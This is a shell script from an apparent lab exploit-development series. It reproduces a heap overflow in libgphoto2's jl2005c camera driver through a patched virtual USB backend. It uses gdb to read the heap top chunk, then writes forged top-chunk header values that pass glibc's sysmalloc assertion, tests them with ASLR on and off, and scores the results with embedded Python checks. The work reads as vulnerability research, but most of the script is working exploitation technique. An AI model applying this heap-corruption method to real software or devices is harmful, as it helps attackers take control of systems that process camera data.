#!/bin/sh
# W200: causal refinement of the W197 top-header repair. glibc's sysmalloc
# assertion requires old_end = top + (size & ~7) to be PAGE-ALIGNED; it does
# not require the gdb-measured top size. Any word with the same 12-bit page
# congruence repairs the overflowed top header, so the reply magnitude is
# irrelevant over a bounded range and a device can cycle candidates.
# LAB-ONLY: no wire, physical USB, command or witness. The right low 12 bits
# depend on this build's heap offset and are NOT device-observable.
set -eu
HERE=$(CDPATH= cd -- "$(dirname "$0")" && pwd)
T=$(CDPATH= cd -- "$HERE/.." && pwd)
S=${S:-/tmp/w193-lgp-base/src/libgphoto2-2.5.34}
B=${B:-/tmp/w197-o2}
P=$B/installdir
PROBE=$B/consumer-probe
OUT=${OUT:-$T/evidence/w200-page-family.out}
VULN_SHA=0ccb1dac24a837bc58a414942cc74bec47586b826c6c0c91ddcec3adea3d6185

[ -d "$S" ] || { echo "missing pinned source tree: $S" >&2; exit 2; }
[ "$(sha256sum "$S/camlibs/jl2005c/jl2005c.c" | cut -d' ' -f1)" = "$VULN_SHA" ] || {
	echo "vulnerable jl2005c.c sha mismatch" >&2; exit 2; }
grep -q M2SHELL_W195_PRIV "$S/libgphoto2_port/vusb/vusb.c" || {
	echo "vusb lab patch missing" >&2; exit 2; }
[ -x "$PROBE" ] || { echo "missing W197 probe: $PROBE" >&2; exit 2; }
command -v gdb >/dev/null && command -v setarch >/dev/null || {
	echo "gdb and setarch required" >&2; exit 2; }
mkdir -p "$(dirname "$OUT")"
exec >"$OUT" 2>&1

COMMON="CAMLIBS=$P/lib/libgphoto2/2.5.34 IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb LD_LIBRARY_PATH=$P/lib"

echo "== W200: sysmalloc page congruence, not the measured top size =="
echo "source=$S sha=$VULN_SHA build=$B"
# Reuse the W197 gdb map when present; otherwise measure it here.
if [ ! -f "$B/gdb-map.out" ]; then
	timeout 30 gdb -q -batch -ex 'set pagination off' -ex 'set confirm off' \
		-ex 'set breakpoint pending on' -ex 'set disable-randomization on' \
		-ex 'break jl2005c.c:155' -ex 'run' -ex 'p/x priv' \
		-ex 'x/2gx (char*)priv+0x4040' -ex 'find /g $rsp, $rbp+0x200, priv' \
		-ex 'kill' --args env $COMMON M2SHELL_JL2005_VUSB=s \
		M2SHELL_JL2005_COUNT=100 "$PROBE" usb:001,001 "$B/out.bin" \
		> "$B/gdb-map.out" 2>&1
fi
cat "$B/gdb-map.out"
TOP=$(awk '/^0x[0-9a-f]+:.*0x[0-9a-f]+/{print $3; exit}' "$B/gdb-map.out")
case "$TOP" in 0x*) ;; *) echo "cannot read top word" >&2; exit 2;; esac
LOW=$((TOP & 0xfff))
# Three magnitudes with identical low 12 bits; one wrong low bit; one too large.
A=$LOW
C=$((LOW + 0x2000))
D=$((LOW + 0x4000))
BAD=$((LOW ^ 0x100))
OVER=$((TOP + 0x1000))

run() {
	label=$1; aslr=$2; word=$3
	set +e
	if [ "$aslr" = off ]; then
		# shellcheck disable=SC2086
		timeout 8 env $COMMON M2SHELL_JL2005_VUSB=n M2SHELL_JL2005_COUNT=1022 \
			M2SHELL_W195_PRIV=0 M2SHELL_W195_TOP="$(printf '0x%x' "$word")" \
			setarch -R "$PROBE" usb:001,001 "$B/w200-$label.bin" \
			> "$B/w200-$label.out" 2>&1
	else
		# shellcheck disable=SC2086
		timeout 8 env $COMMON M2SHELL_JL2005_VUSB=n M2SHELL_JL2005_COUNT=1022 \
			M2SHELL_W195_PRIV=0 M2SHELL_W195_TOP="$(printf '0x%x' "$word")" \
			"$PROBE" usb:001,001 "$B/w200-$label.bin" \
			> "$B/w200-$label.out" 2>&1
	fi
	rc=$?
	set -e
	echo "=== $label top=$(printf '0x%x' "$word") aslr=$aslr rc=$rc ==="
	cat "$B/w200-$label.out"
}

echo "measured top word $TOP; low 12 bits $(printf '0x%03x' "$LOW")"
echo "== small constant, ASLR off =="
run SMALL off "$A"
echo "== different magnitudes, same congruence, ASLR off =="
run MID off "$C"
run LARGE off "$D"
echo "== same congruence, ASLR on =="
run MID_ASLR on "$C"
echo "== wrong low bits (xor 0x100) =="
run BAD off "$BAD"
echo "== same congruence but too large (measured + 0x1000) =="
run OVER off "$OVER"

python3 - "$B" "$A" "$C" "$D" "$BAD" "$OVER" <<'PY'
import os, sys
b = sys.argv[1]
a, c, d, bad, over = map(int, sys.argv[2:7])
def text(n):
    try:
        return open(os.path.join(b, "w200-" + n + ".out"),
                    encoding="utf-8", errors="replace").read()
    except OSError:
        return ""
def good(n):
    t = text(n)
    return ("AFTER_INIT rc=0" in t and "LIST rc=0 count=1022" in t
            and "old_top == initial_top" not in t)
checks = [
    ("three distinct magnitudes", len({a, c, d}) == 3),
    ("family shares low 12 bits", len({a & 0xfff, c & 0xfff, d & 0xfff}) == 1),
    ("bad word has different low bits", (bad & 0xfff) != (a & 0xfff)),
    ("small fixed word lists 1022", good("SMALL")),
    ("mid fixed word lists 1022", good("MID")),
    ("large fixed word lists 1022", good("LARGE")),
    ("mid fixed word lists 1022 with ASLR on", good("MID_ASLR")),
    ("wrong low bits fail sysmalloc assertion",
     "old_top == initial_top" in text("BAD")),
    ("wrong low bits no listing", "LIST rc=0 count=1022" not in text("BAD")),
    ("over-large word faults", "Segmentation fault" in text("OVER")),
    ("over-large word no listing", "LIST rc=0 count=1022" not in text("OVER")),
]
for name, ok in checks:
    print(("PASS " if ok else "FAIL ") + name)
p = sum(ok for _, ok in checks)
print("RESULT: %d PASS / %d FAIL" % (p, len(checks) - p))
raise SystemExit(0 if p == len(checks) else 1)
PY
# End W200 replay.
